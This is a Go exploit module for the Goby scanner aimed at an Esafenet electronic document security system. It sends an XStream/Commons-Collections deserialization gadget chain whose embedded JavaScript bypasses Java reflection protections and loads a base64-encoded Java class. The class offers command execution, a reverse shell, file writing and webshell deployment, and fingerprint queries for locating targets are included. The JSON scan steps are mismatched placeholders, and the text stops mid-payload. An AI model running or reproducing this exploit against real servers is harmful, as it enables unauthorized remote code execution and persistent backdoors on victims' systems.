package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Esafenet Electronic Document Security Management System SetEstAlertLogService API Remote Code Execution Vulnerability",
    "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2023-12-08",
    "PostTime": "2024-01-03",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "3",
    "Impact": "<p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a fix for the vulnerability, please contact the manufacturer for updates: <a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 SetEstAlertLogService 接口远程代码执行漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br></p><p>亿赛通电子文档安全管理系统存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请联系厂商更新：<a href=\"https://www.esafenet.com/\" target=\"_blank\">https://www.esafenet.com/</a></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Esafenet Electronic Document Security Management System SetEstAlertLogService API Remote Code Execution Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a fix for the vulnerability, please contact the manufacturer for updates: <a href=\"https://www.esafenet.com/\" target=\"_blank\">https://www.esafenet.com/</a><br></p>",
            "Impact": "<p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10920"
}`

	sendPayloadSetEstAlertLogServiceXOIUWRNDASIJ := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/SetEstAlertLogService")
		postRequestConfig.Header.Store("cmd", cmd)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Accept", "*/*")
		//postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = `<set>
  <org.apache.commons.collections.keyvalue.TiedMapEntry>
    <map class="org.apache.commons.collections.map.LazyMap" serialization="custom">
      <unserializable-parents/>
      <org.apache.commons.collections.map.LazyMap>
        <default>
          <factory class="org.apache.commons.collections.functors.ChainedTransformer">
            <iTransformers>
              <org.apache.commons.collections.functors.ConstantTransformer>
                <iConstant class="java-class">javax.script.ScriptEngineManager</iConstant>
              </org.apache.commons.collections.functors.ConstantTransformer>
              <org.apache.commons.collections.functors.InvokerTransformer>
                <iMethodName>newInstance</iMethodName>
                <iParamTypes/>
                <iArgs/>
              </org.apache.commons.collections.functors.InvokerTransformer>
              <org.apache.commons.collections.functors.InvokerTransformer>
                <iMethodName>getEngineByName</iMethodName>
                <iParamTypes>
                  <java-class>java.lang.String</java-class>
                </iParamTypes>
                <iArgs>
                  <string>js</string>
                </iArgs>
              </org.apache.commons.collections.functors.InvokerTransformer>
              <org.apache.commons.collections.functors.InvokerTransformer>
                <iMethodName>eval</iMethodName>
                <iParamTypes>
                  <java-class>java.lang.String</java-class>
                </iParamTypes>
                <iArgs>
                  <string>try {
  load(&quot;nashorn:mozilla_compat.js&quot;);
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName(&quot;sun.misc.Unsafe&quot;).getDeclaredField(&quot;theUnsafe&quot;);
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName(&quot;java.lang.Class&quot;).getResourceAsStream(&quot;Class.class&quot;).readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField(&quot;reflectionData&quot;);
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName(&quot;jdk.internal.reflect.Reflection&quot;);
  } catch (error) {
    reflectionClass = java.lang.Class.forName(&quot;sun.reflect.Reflection&quot;);
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream(&quot;Reflection.class&quot;).readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField(&quot;fieldFilterMap&quot;);
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField(&quot;methodFilterMap&quot;);
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName(&quot;java.util.HashMap&quot;))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName(&quot;java.util.HashMap&quot;).getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName(&quot;java.util.HashMap&quot;))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName(&quot;java.util.HashMap&quot;).getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName(&quot;java.lang.Class&quot;));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName(&quot;java.lang.reflect.AccessibleObject&quot;).getDeclaredField(&quot;override&quot;);
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(bytes){
  var clz = null;
  var version = java.lang.System.getProperty(&quot;java.version&quot;);
  var unsafe = getUnsafe();
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName(&quot;java.net.URL&quot;), 0));
  try{
    if (version.split(&quot;.&quot;)[0] &gt;= 11) {
      bypassReflectionFilter();
    defineClassMethod = java.lang.Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, java.lang.Class.forName(&quot;[B&quot;),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
    setAccessible(defineClassMethod);
    // 绕过 setAccessible 
    clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName(&quot;java.security.cert.Certificate&quot;), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz;
  }
}
function base64DecodeToByte(str) {
  var bt;
  try{
    bt = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;).newInstance().decodeBuffer(str);
  }catch(e){}
  if (bt == null){
    try{
      bt = java.lang.Class.forName(&quot;java.util.Base64&quot;).newInstance().getDecoder().decode(str);
    }catch(e){}
  }
  if(bt == null){
    try{
      bt = java.util.Base64.getDecoder().decode(str);
    }catch(e){}
  }
  if (bt == null){
    bt = java.lang.Class.forName(&quot;org.apache.commons.codec.binary.Base64&quot;).newInstance().decode(str);
  }
  return bt;
}
var code=&quot;yv66vgAAADEBmgoAHgCtCgBDAK4KAEMArwoAHgCwCACxCgAcALIKALMAtAoAswC1BwC2CgBDALcIAKUKACEAuAgAuQgAugcAuwgAvAgAvQcAvgoAHAC/CADACADBBwDCCwAWAMMLAMQAxQsAxADGCADHCADIBwDJCgAcAMoHAMsKAMwAzQgAzgcAzwgA0AoAjwDRCgAhANIIANMJANQA1QoA1ADWCADXCgCPANgKABwA2QgA2gcA2woAHADcCADdBwDeCADfCADgCgAcAOEHAOIKAEMA4woA5ADYCADlCgAhAOYIAOcKACEA6AgA6QoAIQDqCgCPAOsIAOwKACEA7QgA7gkAjwDvCgDUAPAJAI8A8QcA8goAQwDzCgBDAPQIAKYIAPUIAPYKAI8A9wgA+AoAjwD5BwD6CgBMAPsHAPwKAE4A/QoAjwD+CgBOAP8KAE4BAAoATgEBCgAvAQIKAEwBAwoAIQEECAEFCgEGAQcKACEBCAgBCQgBCggBCwcBDAoAXQCtCgBdAQ0IAQ4KAF0BAggBDwgBEAgBEQgBEgoBEwEUCgETARUHARYKARcBGAoAaAEZCAEaCgBoARsKAGgAxQoAaAEcCgEXAR0KARcBHggBHwgBIAoBEwEhBwEiCgB0ASMKAHQBGAoBFwEkCgB0ASQKAHQBJQoBJgEnCgEmASgKASkBKgoBKQEABQAAAAAAAAAyCgBDASsKARcBLAoAdAEBCAEtCgAvAS4IAS8IATAKANQBMQoAjwEyCAEzCAE0CAE1CAE2CACpCAE3BwE4AQAMQkFTRTY0X0NIQVJTAQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29uc3RhbnRWYWx1ZQgBOQEAAmlwAQAEcG9ydAEAE0xqYXZhL2xhbmcvSW50ZWdlcjsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlTaWduYXR1cmUBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M8Kj47AQAFcHJveHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApjbGVhclBhcmFtAQAEZXhlYwEAB3JldmVyc2UBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAKU291cmNlRmlsZQEAB0E0LmphdmEMAJcAmAwBOgE7DAE8AT0MAT4BPwEAB3RocmVhZHMMAUABQQcBQgwBQwFEDAFFAUYBABNbTGphdmEvbGFuZy9UaHJlYWQ7DAFHAUgMAUkBSgEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFLAT8BAAZnbG9iYWwBAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMAUwBTQcBTgwBTwFQDAFRAVIBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBUwFUAQAQamF2YS9sYW5nL09iamVjdAcBVQwBVgFXAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAoAChDAFYAVkBAAlzZXRTdGF0dXMHAVoMAVsBXAwBXQFeAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rDACcAJ0MAV8BUgEACHNldEJ5dGVzAQACW0IMAWABVAEAB2RvV3JpdGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcgEABHdyYXAMAWEAnQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFiAWMHAWQBAAAMAWUBZgEAEGNvbW1hbmQgbm90IG51bGwMAWcBSAEABSMjIyMjDAFoAWkMAKQAoQEAAToMAWoBawEAImNvbW1hbmQgcmV2ZXJzZSBob3N0IGZvcm1hdCBlcnJvciEMAJQAkQwBbAFtDACVAJYBABBqYXZhL2xhbmcvVGhyZWFkDACXAW4MAW8AmAEABSQkJCQkAQASZmlsZSBmb3JtYXQgZXJyb3IhDACiAKMBAAVAQEBAQAwApQChAQAMamF2YS9pby9GaWxlDACXAXABABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAJcBcQwAqQCqDACiAXIMAXMAmAwBdACYDAF1AUgMAXYBSAwBdwF4AQAHb3MubmFtZQcBeQwBegChDAF7AUgBAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBfAF9AQAFIC1uIDQBAAIvYwEABSAtdCA0AQACc2gBAAItYwcBfgwBfwGADAClAYEBABFqYXZhL3V0aWwvU2Nhbm5lcgcBggwBgwGEDACXAYUBAAJcYQwBhgGHDAFRAUgMAYgBhAwBiQCYAQAHL2Jpbi9zaAEAB2NtZC5leGUMAKUBigEAD2phdmEvbmV0L1NvY2tldAwAlwGLDAGMAY0MAY4BUAcBjwwBkAGRDAGSAZEHAZMMAKIBlAwBlQGWDAGXAZEBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBmAFIAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAZkBkQwApgCnAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAmb3JnLmFwYWNoZS5jb21tb25zLmNvZGVjLmJpbmFyeS5CYXNlNjQBAAJBNAEAQEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8BAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAA1nZXRTdXBlcmNsYXNzAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQASamF2YS91dGlsL0l0ZXJhdG9yAQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRCeXRlcwEABCgpW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQALbmV3SW5zdGFuY2UBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAXKExqYXZhL2xhbmcvUnVubmFibGU7KVYBAAVzdGFydAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEShMamF2YS9pby9GaWxlOylWAQAFKFtCKVYBAAVmbHVzaAEABWNsb3NlAQAIdG9TdHJpbmcBAA9nZXRBYnNvbHV0ZVBhdGgBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAIaXNDbG9zZWQBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQAEKEkpVgEABXNsZWVwAQAEKEopVgEACWV4aXRWYWx1ZQEACmdldE1lc3NhZ2UBAAhpbnRWYWx1ZQAhAI8AHgABAA8AAwAaAJAAkQABAJIAAAACAJMAAgCUAJEAAAACAJUAlgAAAAkAAQCXAJgAAgCZAAADtgAGABMAAAKOKrcAAbgAArYAA0wrtgAEEgW2AAZNLAS2AAcsK7YACMAACcAACU4tOgQZBL42BQM2BhUGFQWiAlgZBBUGMjoHGQfHAAanAkMZB7YACjoIGQgSC7YADJoADRkIEg22AAyaAAanAiUZB7YABBIOtgAGTSwEtgAHLBkH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